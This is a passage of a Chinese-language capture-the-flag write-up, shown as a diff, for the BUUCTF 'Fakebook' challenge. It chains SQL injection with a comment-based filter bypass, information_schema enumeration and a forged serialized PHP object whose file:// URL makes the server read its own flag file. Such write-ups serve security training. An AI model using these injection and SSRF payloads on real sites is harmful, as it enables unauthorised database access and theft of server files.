@@ -1,6 +1,67 @@
 日期：2026/5/2         题目：[网鼎杯 2018]Fakebook 1           平台：BUUCTF
 
 攻击过程
-  第一步：打开网页，看到了join和login按钮，对login的页面进行sql注入失败，打开join页面，看到一些输入框，输入信息
+  第一步：打开网页，看到了join和login按钮，对login的页面进行sql注入失败，打开join页面，看到一些输入框，输入信息分别是name，pwd，age，blog（猜想blog是网址，很可能和SSRF或者CSRF之类的有关），join成功之后
+    回到主页面，发现刚刚的信息已经显示在主页面了，并且name那一列还有一个 <a href="view.php?no=1">aaa</a> 的链接跳转
+  第二步：点击链接，跳转到view.php页面，这个页面是我们刚才上传的join的详细信息，打开源码还会发现有一个<iframe width='100%' height='10em' src='data:text/html;base64,'>，可以看出应该是网站服务器访问
+    join中的blog，所以得出思路：让服务器读取他自己的敏感文件，如flag.txt之类的，在join中上传blog时候上传敏感文件路径
+  第三步：由于不知道敏感文件和服务器的文件结构，所以dirsearch扫描网站，发现有robots.txt和flag.txt，读取robots.txt发现有 /user.php.bak文件，访问下载，得到user.php源码。源码如下：
+    可以看到get方法，使用curl_exec访问目标URL，所以想构造一个blog为file:///var/www/html/flag.php，但是 isValidBlog ()方法检测到非法，所以失败
+    <?php
+    class UserInfo
+    {
+        public $name = "";
+        public $age = 0;
+        public $blog = "";
+    
+        public function __construct($name, $age, $blog)
+        {
+            $this->name = $name;
+            $this->age = (int)$age;
+            $this->blog = $blog;
+        }
+    
+        function get($url)
+        {
+            $ch = curl_init();
+    
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            $output = curl_exec($ch);
+            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            if($httpCode == 404) {
+                return 404;
+            }
+            curl_close($ch);
+    
+            return $output;
+        }
+    
+        public function getBlogContents ()
+        {
+            return $this->get($this->blog);
+        }
+    
+        public function isValidBlog ()
+        {
+            $blog = $this->blog;
+            return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
+        }
+
+  第四步：回到view.php?no=1页面，怀疑可以sql注入，所以尝试no=22 /*!or*/ /*!1=1*/# 成功，之后使用no=1 order by 4#得知列数，然后使用union select，发现被检测sql注入，再次尝试单独的union和select，
+    发现都没有被检测，说明检测针对的是union select，最终使用union/**/ select成功绕过！之后使用union/**/ select 1,2,3,4#，得到username那一列为2，以及提示如下：
+            Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31
+    这个可以得知sql数据库中很可能存有第三步得到的那个UserInfo类的对象的序列化，以及可以知道文件路径是var/www/html，所以有机会绕过isValidBlog方法了，即我们使用union select构造一个假的结果，这个结果
+    中某一列是一个序列化的UserInfo，他的blog=file:///var/www/html,！！！并且根据已知来推断，union select的第二列是username，第三列是age（因为正常的结果显示第三列是age，第四列是blog），第四列就是这
+    个序列化的字符串！！！
+    为了验证推断，使用no=22 union/**/ select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'#
+                    no=22%20union/**/%20select%201,group_concat(table_name),3,4%20from%20information_schema.tables%20where%20table_schema=%27fakebook%27#
+                    no=22 union/**/ select% 1,group_concat(no,username,passwd,data),3,4 from users
+    得到的结果和猜测一样
+最后： no=22 union/**/ select 1,2,11,'O:8:"UserInfo":3:{s:4:"name";s:2:"oo";s:3:"age";i:11;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'#
+  成功得到flag
+
+    
+    
   
 
